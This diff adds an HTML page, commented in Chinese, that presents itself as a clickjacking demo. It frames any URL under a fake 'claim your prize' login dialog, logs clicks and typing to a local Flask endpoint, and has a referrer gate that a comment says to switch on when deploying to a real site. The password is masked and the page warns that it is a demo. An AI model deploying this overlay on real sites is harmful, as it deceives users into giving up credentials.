@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flask 后端安全演示</title>
+    <style>
+        body {
+            font-family: 'Microsoft YaHei', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0;
+            background-color: #f0f0f0; /* 页面背景色 */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+            flex-direction: column; /* 元素垂直堆叠 */
+        }
+        .access-denied {
+            display: none; /* 默认隐藏 */
+            color: #d9534f; /* 危险色 */
+            font-size: 1.5em;
+            font-weight: bold;
+            text-align: center;
+            padding: 20px;
+            border: 2px dashed #d9534f;
+            margin-top: 20px;
+            background-color: #fcf8e3; /* 淡黄色背景 */
+            border-radius: 8px;
+            width: 80%; /* 宽度 */
+            max-width: 500px; /* 最大宽度 */
+        }
+        .main-content {
+            display: none; /* 默认隐藏，通过来源检查后显示 */
+            width: 100%;
+            height: 100vh; /* 内容区域填满整个视口 */
+            position: relative; /* 用于 iframe 和覆盖层的定位 */
+            overflow: hidden; /* 隐藏超出部分 */
+            background-color: #ffffff; /* 主要内容区域背景 */
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            border-radius: 10px;
+            box-sizing: border-box; /* 确保 padding 不会增加总宽度 */
+        }
+        h1 {
+            color: #007bff; /* 主要蓝色 */
+            margin-top: 15px;
+            text-align: center;
+        }
+        .parent-page-inputs { /* 父页面自身的输入框区域 */
+            padding: 20px;
+            background-color: #f0f0f0;
+            margin: 10px auto; /* 居中显示 */
+            border-radius: 5px;
+            width: 80%; /* 宽度 */
+            max-width: 600px;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 15px;
+            border: 1px solid #ddd;
+        }
+        .parent-page-inputs label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .parent-page-inputs input[type="text"] {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+            width: 200px; /* 输入框固定宽度 */
+            box-sizing: border-box;
+        }
+        .interaction-logs {
+            margin-top: 20px;
+            width: 80%; /* 宽度 */
+            max-width: 600px;
+            margin: 20px auto; /* 居中 */
+            padding: 15px;
+            background-color: #333; /* 深色背景 */
+            color: #0f0; /* 绿色文本 */
+            font-family: monospace; /* 等宽字体 */
+            white-space: pre-wrap; /* 保留换行和空格 */
+            word-wrap: break-word; /* 长单词换行 */
+            height: 150px; /* 固定高度 */
+            overflow-y: auto; /* 滚动条 */
+            border-radius: 5px;
+            box-sizing: border-box;
+            border: 1px solid #444;
+        }
+        .interaction-logs h3 {
+            margin-top: 0;
+            color: #0f0; /* 绿色标题 */
+        }
+
+        /* --- iframe 样式 --- */
+        .target-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh; /* 填满父级内容区域 */
+            border: none; /* 移除默认边框 */
+            z-index: 1; /* 位于覆盖层下方 */
+            box-sizing: border-box;
+            border-radius: 10px; /* 配合外层圆角 */
+        }
+
+        /* --- 点击劫持覆盖层样式 --- */
+        .clickjacking-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh; /* 覆盖整个父级内容区域 */
+            z-index: 10;
+            pointer-events: none; /* 初始状态下，允许点击穿透到 iframe */
+            display: flex; /* 使用 Flexbox 来居中对话框 */
+            justify-content: center; /* 水平居中 */
+            align-items: center; /* 垂直居中 */
+            box-sizing: border-box;
+        }
+        .overlay-dialog { /* 对话框本身 */
+            width: 80%; /* 对话框的响应式宽度 */
+            max-width: 450px; /* 对话框的最大宽度 */
+            background-color: rgba(255, 255, 255, 0.85); /* 半透明白色背景 */
+            padding: 25px; /* 内部填充 */
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            text-align: center;
+            pointer-events: auto; /* 允许对话框及其内容接收事件 */
+            display: flex; /* 对话框内部元素使用 Flexbox 布局 */
+            flex-direction: column; /* 元素垂直堆叠 */
+            gap: 15px; /* 元素间距 */
+            border: 1px solid #ccc; /* 对话框边框 */
+            box-sizing: border-box; /* 确保 padding 不会增加总宽度 */
+        }
+        .overlay-dialog input[type="text"],
+        .overlay-dialog input[type="password"] {
+            width: calc(100% - 20px); /* 输入框宽度，考虑 padding */
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+        .overlay-dialog button {
+            width: 100%; /* 按钮宽度 */
+            padding: 12px 20px;
+            background-color: #28a745; /* 绿色，模拟“奖励”按钮 */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+        .overlay-dialog button:hover {
+            background-color: #218838;
+        }
+        .overlay-instructions {
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #555;
+        }
+        .overlay-instructions b {
+            color: #d9534f; /* 醒目提示 */
+        }
+    </style>
+</head>
+<body>
+
+<!-- 访问拒绝提示 -->
+<div id="accessDeniedMessage" class="access-denied">
+    访问被拒绝：您必须通过指定的网站跳转过来才能访问此页面。
+    <br><!-- 换行 -->
+    <!-- 提示用户如何进行测试 -->
+    <div style="font-size: 0.8em; margin-top: 10px; color: #333;">
+        <b>测试提示:</b> 请确保 <code>IS_SOURCE_CHECK_ENABLED</code> 为 <code>true</code> 且 <code>ALLOWED_REFERRER_DOMAIN_PATTERN</code> 匹配您打开此页面的来源（例如，如果您用 Python 的 `http.server` 运行，则可能是 <code>localhost</code>）。
+    </div>
+</div>
+
+<!-- 主要内容区域，在允许访问时显示 -->
+<div id="mainContentArea" class="main-content">
+    <h1>欢迎！(已通过来源验证)</h1>
+
+    <!-- 父页面自身的输入框，用于演示的父页面交互监听 -->
+    <!-- 这里的输入框是通用输入，可用于检测 URL 或其他文本 -->
+    <div class="parent-page-inputs">
+        <div>
+            <label for="parentUrlInput">URL 检测框:</label>
+            <input type="text" id="parentUrlInput" placeholder="输入 URL 或其他...">
+        </div>
+        <div>
+            <label for="parentActionInput">操作记录框:</label>
+            <input type="text" id="parentActionInput" placeholder="输入文本记录...">
+        </div>
+    </div>
+
+    <!-- iframe 加载的目标页面 -->
+    <!-- !!! 重要：在您运行 Flask 应用时，请将此处的 src 改为 Flask 应用中您想要加载的页面，
+         或者一个通用的URL，例如 'about:blank' 或一个示例网站。
+         如果您想加载您自己的 Vue/React 应用，那是一个单独的服务，需要配置。 -->
+    <!-- 假设我们加载一个简单的占位符页面，或者是一个实际的登录页面 -->
+    <iframe id="targetIframe" class="target-iframe" src="" title="目标网站内容"></iframe>
+
+    <!-- 点击劫持覆盖层 -->
+    <!-- 此 div 视觉上叠加在 iframe 之上，并包含一个居中的对话框 -->
+    <div id="clickjackingOverlay" class="clickjacking-overlay">
+        <div class="overlay-dialog"> <!-- 对话框容器 -->
+            <h3>特别优惠！领取您的奖！</h3>
+            <!-- 假的用户名输入框 -->
+            <input type="text" id="fakeUsernameInput" class="fake-input" placeholder="输入您的用户名">
+
+            <!-- 假的密码输入框 -->
+            <input type="password" id="fakePasswordInput" class="fake-input" placeholder="输入您的密码">
+
+            <!-- 假的提交按钮 -->
+            <button id="fakeSubmitButton" class="fake-button">领取奖励！</button>
+
+            <div class="overlay-instructions">
+                <b>警告：</b>这是一个点击劫持演示。在此处输入或点击按钮，
+                您的操作会被拦截并发送到下方的（模拟的）目标登录表单。
+                您输入和点击的日志将被发送到 Flask 后端。
+            </div>
+        </div>
+    </div>
+
+    <!-- 日志显示区域 -->
+    <div class="interaction-logs">
+        <h3>页面交互日志 (前端):</h3>
+        <pre id="interactionLog">尚未记录任何交互。</pre>
+    </div>
+</div>
+
+<script>
+    // --- Configuration ---
+    // !!! 重要：在您实际部署到网站时，请将这里的 '!!' 移除，以启用来源检查！
+    // 例如，修改为 const IS_SOURCE_CHECK_ENABLED = true;
+    const IS_SOURCE_CHECK_ENABLED = false; // 默认禁用，方便测试。设置为 true 启用来源检查。
+    // !!! 在这里替换为您允许的跳转网站域名！
+    // 例如：如果您用 Python 的 http.server 运行 index.html，可以设置为 /localhost:\d+/
+    // 或者如果您是从一个真正的网站跳转过来的，就填那个网站的域名。
+    const ALLOWED_REFERRER_DOMAIN_PATTERN = /localhost:8000/; // 示例：允许来自 localhost:8000 的访问
+
+    // !!! 指向您的 Flask 后端日志收集 API !!!
+    const BACKEND_LOG_URL = 'http://localhost:5000/api/log';
+
+    let allFrontendLogs = []; // 用于存储前端日志条目
+
+    // --- Helper function: Log interactions to UI and Console ---
+    function logFrontendInteraction(message, data = null, type = 'Global') {
+        // 将 'type' 键修改为 'log_type'
+        const logEntry = { message, data, log_type: type, timestamp: new Date().toISOString() };
+        allFrontendLogs.push(logEntry);
+        // Keep logs manageable, e.g., only show the last 20 entries in the UI
+        if (allFrontendLogs.length > 20) {
+            allFrontendLogs.shift();
+        }
+        const logElement = document.getElementById('interactionLog');
+        if (logElement) {
+            logElement.textContent = allFrontendLogs.map(entry => {
+                // Format timestamp to show time only
+                const time = entry.timestamp.split('T')[1].split('.')[0];
+                // Prefix log type for clarity
+                return `${time} [${entry.type}] ${entry.message}${entry.data ? `: ${JSON.stringify(entry.data)}` : ''}`;
+            }).join('\n');
+        }
+        console.log(`[Frontend Log] [${type}] ${message}`, data); // Also log to browser console
+    }
+
+    // --- Function to send logs to the backend ---
+    function sendFrontendLogsToBackend() {
+        if (allFrontendLogs.length === 0) {
+            console.log("[Frontend] No logs to send.");
+            return;
+        }
+
+        // Send only the most recent logs, e.g., last 10
+        const logsToSend = allFrontendLogs.slice(-10);
+
+        fetch(BACKEND_LOG_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ logs: logsToSend }),
+        })
+            .then(response => {
+                if (!response.ok) {
+                    console.error(`[Frontend] Failed to send logs to backend: ${response.statusText}`);
+                } else {
+                    console.log(`[Frontend] Successfully sent ${logsToSend.length} logs to backend.`);
+                    // Optionally clear logs after successful send, or mark them as sent
+                    // For this demo, we'll keep them in the UI for viewing.
+                }
+            })
+            .catch(error => {
+                console.error('[Frontend] Error sending logs:', error);
+            });
+    }
+
+    // --- 1. Referrer Check & Page Initialization ---
+    function initializePage() {
+        const referrer = document.referrer; // 获取上一个页面的 URL
+        const currentUrl = window.location.href; // 当前页面的 URL
+
+        logFrontendInteraction(`Page loaded. Referrer: ${referrer || 'N/A'}`, null, 'System');
+
+        const isAllowedReferrer = !IS_SOURCE_CHECK_ENABLED || (referrer && referrer.match(ALLOWED_REFERRER_DOMAIN_PATTERN));
+
+        if (!isAllowedReferrer) {
+            // 如果来源检查已启用且来源不匹配，显示拒绝信息，隐藏主内容
+            document.getElementById('accessDeniedMessage').style.display = 'block';
+            document.getElementById('mainContentArea').style.display = 'none';
+            logFrontendInteraction("Access Denied: Referrer is not from an allowed source.", null, 'System');
+        } else {
+            // 如果来源检查已禁用，或来源匹配，显示欢迎信息和主内容
+            if (IS_SOURCE_CHECK_ENABLED) {
+                logFrontendInteraction(`Access Granted: Referrer matches pattern "${ALLOWED_REFERRER_DOMAIN_PATTERN}".`, null, 'System');
+            } else {
+                logFrontendInteraction("Access Granted: Source check is disabled, allowing access.", null, 'System');
+            }
+            document.getElementById('accessDeniedMessage').style.display = 'none';
+            document.getElementById('mainContentArea').style.display = 'flex'; // 显示主内容
+
+            // --- 2. Prompt for URL input to determine iframe content ---
+            // 只有在允许访问时才进行此操作
+            const iframeUrlPrompt = prompt(
+                "请输入您希望在 iframe 中加载的网站 URL (例如 'https://example.com' 或 'about:blank'):"
+            );
+
+            const iframeElement = document.getElementById('targetIframe');
+            if (iframeUrlPrompt) {
+                iframeElement.src = iframeUrlPrompt; // 设置 iframe 的 src
+                logFrontendInteraction(`Iframe source set to: ${iframeUrlPrompt}`, null, 'System');
+            } else {
+                // 如果用户取消或未输入 URL，可以设置一个默认的或显示错误
+                iframeElement.src = 'about:blank'; // 使用 about:blank 作为默认空页面
+                logFrontendInteraction("User cancelled URL input or provided empty URL. Setting iframe source to 'about:blank'.", null, 'System');
+            }
+
+            // --- 3. Attach all event listeners ---
+            attachEventListeners();
+        }
+    }
+
+    // --- 4. Attach All Event Listeners: Global and Overlay Elements ---
+    function attachEventListeners() {
+        const overlayDiv = document.getElementById('clickjackingOverlay');
+        const overlayDialog = overlayDiv ? overlayDiv.querySelector('.overlay-dialog') : null; // 获取对话框容器
+
+        // --- A. Global Document Listeners (Capture Phase) ---
+        // 监听整个文档的点击和输入事件，以区分是父页面交互还是覆盖层交互
+
+        // Global click listener
+        document.addEventListener('click', (event) => {
+            const target = event.target; // 实际被点击的元素
+
+            // 检查点击是否发生在覆盖层对话框内部
+            if (overlayDialog && overlayDialog.contains(target)) {
+                // 点击发生在覆盖层对话框内的元素（假输入框或假按钮）
+                logFrontendInteraction("Detected click within overlay dialog area.", null, 'Hijack');
+                // 如果是点击了假按钮，执行模拟操作
+                if (target.id === 'fakeSubmitButton') {
+                    // Log that the fake button was clicked
+                    logFrontendInteraction(`Clicked Fake Submit Button on Overlay: ${target.id}`, null, 'Hijack');
+                    // Simulate the intent of a real clickjacking attack: show a message
+                    alert("操作模拟：您点击了“领取奖励”按钮。您的操作已记录并发送到后台。");
+                    // Trigger sending logs to backend after a simulated "action"
+                    sendFrontendLogsToBackend();
+                }
+            } else {
+                // 点击发生在主页面的其他地方，不在覆盖层对话框内
+                // 记录父页面上的交互事件
+                logFrontendInteraction("Detected Parent Page Interaction", {
+                    tag: target.tagName,
+                    id: target.id || null,
+                    // 记录一些坐标信息，以便分析点击位置
+                    pageX: event.pageX,
+                    pageY: event.pageY
+                }, 'Global');
+            }
+        }, true); // 使用捕获阶段 (true)，优先捕获事件
+
+        // Global input listener (主要用于键盘输入)
+        document.addEventListener('input', (event) => {
+            const target = event.target;
+
+            // 检查输入是在父页面的输入框中
+            if (target.id === 'parentUrlInput' || target.id === 'parentActionInput') {
+                let inputValue = target.value;
+                logFrontendInteraction(`Parent Page Input (${target.id})`, { value: inputValue }, 'Global');
+            }
+            // 检查输入是在覆盖层对话框内的假输入框中
+            else if (overlayDialog && overlayDialog.contains(target)) {
+                if (target.id === 'fakeUsernameInput' || target.id === 'fakePasswordInput') {
+                    let inputValue = target.value;
+                    // 掩码敏感信息，尤其是密码
+                    if (target.id === 'fakePasswordInput') {
+                        inputValue = '[Overlay Password Input - Masked]';
+                    } else {
+                        inputValue = `[Overlay Input ${target.id} - User Typed]`;
+                    }
+                    logFrontendInteraction(`Overlay Fake Input (${target.id})`, { value: inputValue }, 'Hijack');
+                }
+            }
+        }, true); // 使用捕获阶段
+
+        // --- B. Specific Listeners for Elements within the Overlay Dialog ---
+        // 虽然上面的全局监听已经能捕获到，但为了独立性，也可以保留对特定元素的监听
+        // 例如，这里直接处理假按钮的点击，避免了在全局监听中做二次判断
+
+        // const fakeUsernameInput = document.getElementById('fakeUsernameInput');
+        // const fakePasswordInput = document.getElementById('fakePasswordInput');
+        const fakeSubmitButton = document.getElementById('fakeSubmitButton');
+
+        // Global click listener handles the fake submit button click correctly now.
+        // If we want to isolate it, we can add it here again, but it's redundant with the capture phase listener.
+        // if (fakeSubmitButton) {
+        //     fakeSubmitButton.addEventListener('click', (event) => {
+        //         // This part is already handled by the global listener in capture phase
+        //         // logFrontendInteraction(`Clicked Fake Submit Button on Overlay: ${event.target.id}`, null, 'Hijack');
+        //         // alert("操作模拟：您点击了“领取奖励”按钮。您的操作已记录并发送到后台。");
+        //         // sendFrontendLogsToBackend();
+        //     });
+        // }
+
+        // --- C. Send logs when the page is about to be unloaded ---
+        // Add an event listener to send logs when the tab/window is closed or navigated away.
+        window.addEventListener('beforeunload', sendFrontendLogsToBackend);
+    }
+
+    // --- Initialize the page when it loads ---
+    window.addEventListener('load', initializePage);
+
+</script>
+</body>
+</html>
